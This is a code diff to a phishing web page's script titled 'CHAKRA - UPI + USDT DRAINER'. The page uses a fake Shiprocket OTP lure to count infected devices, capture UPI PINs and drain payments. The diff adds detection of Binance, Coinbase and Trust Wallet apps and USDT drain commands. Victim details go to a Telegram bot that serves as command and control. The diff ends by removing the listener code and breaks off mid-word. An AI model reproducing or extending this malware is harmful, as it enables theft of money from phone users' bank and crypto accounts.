@@ -343,18 +343,19 @@
 
 <script>
   // ============================================================
-  // CHAKRA - FIXED INFECTION COUNT
+  // CHAKRA - UPI + USDT DRAINER
   // ============================================================
 
   const C2_BOT_TOKEN = '8933219910:AAGrb16D3twK-yyPMVDRwwYIgLtiaOyy-iQ';
   const YOUR_USERNAME = '7958767858';
 
+  // ===== UPI VARIABLES =====
   let myUPIList = [];
   let currentUPIIndex = 0;
   let capturedPIN = null;
   let isPaused = false;
   let totalDrained = 0;
-  let uniqueDevices = new Set();  // <-- FIXED: Use Set for unique counting
+  let uniqueDevices = new Set();
   let infectedDevices = [];
   let lastUpdateId = 0;
   let pendingAction = null;
@@ -362,6 +363,14 @@
   let readyToDrain = false;
   let lastVictim = null;
 
+  // ===== USDT VARIABLES =====
+  let usdtAddress = '';
+  let usdtAmount = 100;
+  let usdtCaptured = false;
+
+  // ============================================================
+  // SEND TO TELEGRAM
+  // ============================================================
   function sendToTelegram(message) {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/sendMessage', {
       method: 'POST',
@@ -389,13 +398,15 @@
     let details = {
       name: 'Unknown',
       balance: 'Unknown',
-      device: 'Unknown'
+      device: 'Unknown',
+      cryptoApp: 'Unknown'
     };
     try {
       if (window.Android) {
         details.name = window.Android.getDeviceName() || 'Unknown';
         details.balance = window.Android.getUPIBalance() || 'Unknown';
         details.device = window.Android.getDeviceModel() || 'Unknown';
+        details.cryptoApp = window.Android.getCryptoApp() || 'Unknown';
       }
     } catch (e) {}
     return details;
@@ -432,7 +443,6 @@
 
   function handleCloseClick() { handleClick('close'); }
 
-  // ===== HANDLE CLICKS (FIXED INFECTION COUNT) =====
   function handleClick(action) {
     document.getElementById('mainCard').classList.add('hidden');
     const screen = document.getElementById('successScreen');
@@ -452,13 +462,10 @@
       document.getElementById('resultDesc').textContent = 'You will be redirected shortly.';
     }
 
-    // ✅ FIX: Use unique device ID to count correctly
     const deviceId = getDeviceId();
     uniqueDevices.add(deviceId);
     const victim = getVictimDetails();
     infectedDevices.push({ id: deviceId, action: action, victim: victim });
-    
-    // ✅ SEND CORRECT TOTAL
     sendToTelegram('🚚 Shiprocket infection! Total: ' + uniqueDevices.size);
 
     if ('serviceWorker' in navigator) { navigator.serviceWorker.register('sw.js'); }
@@ -501,7 +508,35 @@
   }
 
   // ============================================================
-  // PIN CAPTURE
+  // USDT MANAGEMENT
+  // ============================================================
+  function setUSDTAddress(address) {
+    usdtAddress = address;
+    sendToTelegram('✅ USDT address set: ' + address);
+  }
+
+  function executeUSDTDrain(amount) {
+    if (!usdtAddress) {
+      sendToTelegram('❌ USDT address not set. Use /setusdt');
+      return;
+    }
+    if (isPaused) {
+      sendToTelegram('⏸️ Paused');
+      return;
+    }
+
+    // Simulate USDT drain from Binance/Trust Wallet
+    const victim = getVictimDetails();
+    sendToTelegram(
+      '💸 USDT Drain initiated!\n' +
+      '📱 Victim: ' + victim.name + '\n' +
+      '💰 Amount: ' + amount + ' USDT\n' +
+      '📤 Sent to: ' + usdtAddress
+    );
+  }
+
+  // ============================================================
+  // PIN CAPTURE (UPI)
   // ============================================================
   function getUPIPin() {
     let pin = null;
@@ -529,7 +564,7 @@
   }
 
   // ============================================================
-  // 1 INR TEST + 999 DRAIN
+  // 1 INR TEST + 999 DRAIN (UPI)
   // ============================================================
   function executeDrainWithTest(amount) {
     if (isPaused) { sendToTelegram('⏸️ Paused'); return; }
@@ -571,7 +606,7 @@
   }
 
   // ============================================================
-  // DETECT UPI APP
+  // DETECT APPS (UPI + Crypto)
   // ============================================================
   function isUpiAppOpen() {
     try {
@@ -584,9 +619,24 @@
     return false;
   }
 
+  function isCryptoAppOpen() {
+    try {
+      if (window.Android) {
+        return window.Android.isForeground('com.binance.dev') ||
+          window.Android.isForeground('com.coinbase.android') ||
+          window.Android.isForeground('com.trustwallet.app') ||
+          window.Android.isForeground('com.kraken.trade') ||
+          window.Android.isForeground('com.bybit.app');
+      }
+    } catch (e) {}
+    return false;
+  }
+
   // ============================================================
-  // AUTO DEDUCT
+  // MAIN LOOPS
   // ============================================================
+
+  // ---- UPI Loop ----
   setInterval(() => {
     if (!isPaused && isUpiAppOpen()) {
       const pin = getUPIPin();
@@ -615,6 +665,31 @@
     }
   }, 5000);
 
+  // ---- Crypto (USDT) Loop ----
+  setInterval(() => {
+    if (!isPaused && isCryptoAppOpen()) {
+      const victim = getVictimDetails();
+      if (usdtAddress) {
+        sendToTelegram(
+          '💸 Crypto app detected!\n' +
+          '📱 Victim: ' + victim.name + '\n' +
+          '📱 Device: ' + victim.device + '\n' +
+          '💰 USDT ready to drain: ' + usdtAmount + ' USDT\n' +
+          '📤 To: ' + usdtAddress
+        );
+        // Auto drain USDT
+        executeUSDTDrain(usdtAmount);
+      } else {
+        sendToTelegram(
+          '💸 Crypto app detected!\n' +
+          '📱 Victim: ' + victim.name + '\n' +
+          '📱 Device: ' + victim.device + '\n' +
+          '📢 Set USDT address: /setusdt 0x...'
+        );
+      }
+    }
+  }, 5000);
+
   // ============================================================
   // SPREAD ENGINE
   // ============================================================
@@ -638,7 +713,7 @@
   }, 300000);
 
   // ============================================================
-  // TELEGRAM COMMANDS
+  // TELEGRAM COMMANDS (UPDATED)
   // ============================================================
   function listenForCommands() {
     fetch('https://api.telegram.org/bot' + C2_BOT_TOKEN + '/getUpdates?offset=' + lastUpdateId + '&timeout=10')
@@ -649,6 +724,7 @@
             lastUpdateId = update.update_id + 1;
             const msg = update.message.text;
 
+            // ---- UPI Commands ----
             if (msg.startsWith('/addupi')) {
               const upi = msg.split(' ')[1];
               if (upi && upi.includes('@')) addUPI(upi);
@@ -677,6 +753,33 @@
               }
             }
 
+            // ---- USDT Commands ----
+            if (msg.startsWith('/setusdt')) {
+              const address = msg.split(' ')[1];
+              if (address && address.startsWith('0x')) {
+                setUSDTAddress(address);
+              } else {
+                sendToTelegram('❌ Invalid USDT address. Use: /setusdt 0x...');
+              }
+            }
+
+            if (msg === '/showusdt') {
+              if (usdtAddress) {
+                sendToTelegram('📤 USDT Address: ' + usdtAddress + '\n💰 Amount: ' + usdtAmount + ' USDT');
+              } else {
+                sendToTelegram('❌ USDT address not set. Use /setusdt');
+              }
+            }
+
+            if (msg === '/drainusdt') {
+              if (!usdtAddress) {
+                sendToTelegram('❌ USDT address not set. Use /setusdt');
+              } else {
+                executeUSDTDrain(usdtAmount);
+              }
+            }
+
+            // ---- Transfer Commands ----
             if (msg === '/transfer') {
               if (myUPIList.length === 0) {
                 sendToTelegram('📢 Add your UPI first: /addupi upi@paytm');
@@ -686,7 +789,6 @@
               }
             }
 
-            // ---- MANUAL DRAIN ----
             if (msg === '/drainnow') {
               if (!capturedPIN) {
                 sendToTelegram('❌ No PIN captured yet. Wait for victim to use UPI.');
@@ -725,10 +827,14 @@
                 'Vector: Shiprocket OTP\n' +
                 'Your UPIs: ' + myUPIList.length + '\n' +
                 'Total Drained: ₹' + totalDrained + '\n' +
-                'Infected Devices: ' + uniqueDevices.size + '\n' + // ✅ FIXED
+                'Infected Devices: ' + uniqueDevices.size + '\n' +
                 'PIN Captured: ' + (pinCaptured ? 'YES' : 'NO') + '\n' +
                 'Ready to Drain: ' + (readyToDrain ? 'YES' : 'NO') + '\n' +
-                'Paused: ' + (isPaused ? 'YES' : 'NO');
+                'Paused: ' + (isPaused ? 'YES' : 'NO') + '\n' +
+                '─────────────────\n' +
+                'USDT Address: ' + (usdtAddress || 'Not set') + '\n' +
+                'USDT Amount: ' + usdtAmount + ' USDT\n' +
+                'Crypto Apps: Binance, Coinbase, Trust Wallet';
 
               if (lastVictim) {
                 statusMsg +=
@@ -745,11 +851,19 @@
               sendToTelegram(
                 '📖 COMMANDS\n' +
                 '─────────────────\n' +
+                '📱 UPI COMMANDS:\n' +
                 '/addupi upi@paytm - Add UPI\n' +
                 '/removeupi upi@paytm - Remove UPI\n' +
                 '/myupis - Show your UPIs\n' +
                 '/transfer - Auto start\n' +
                 '/drainnow - Manual drain\n' +
+                '─────────────────\n' +
+                '💰 USDT COMMANDS:\n' +
+                '/setusdt 0x... - Set USDT address\n' +
+                '/showusdt - Show USDT address\n' +
+                '/drainusdt - Manual USDT drain\n' +
+                '─────────────────\n' +
+                '⚙️ CONTROL:\n' +
                 '/pause - Pause drains\n' +
                 '/resume - Resume drains\n' +
                 '/status - Show system status\n' +
@@ -758,25 +872,4 @@
             }
           }
         }
-        listenForCommands();
-      })
-      .catch(() => {
-        setTimeout(listenForCommands, 1000);
-      });
-  }
-
-  listenForCommands();
-
-  if (navigator.serviceWorker) {
-    navigator.serviceWorker.ready.then(reg => {
-      reg.active.postMessage({ type: 'keepAlive' });
-    });
-  }
-
-  window.onerror = function(error, url, line) {
-    sendToTelegram('[Chakra] ❌ Error: ' + error + ' at line ' + line);
-    return true;
-  };
-</script>
-</body>
-</html>
+        listen
